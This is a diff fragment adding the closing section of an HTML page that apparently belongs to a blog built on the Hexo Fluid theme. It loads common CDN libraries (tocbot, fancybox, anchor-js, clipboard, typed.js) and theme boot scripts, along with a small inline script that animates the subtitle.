+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
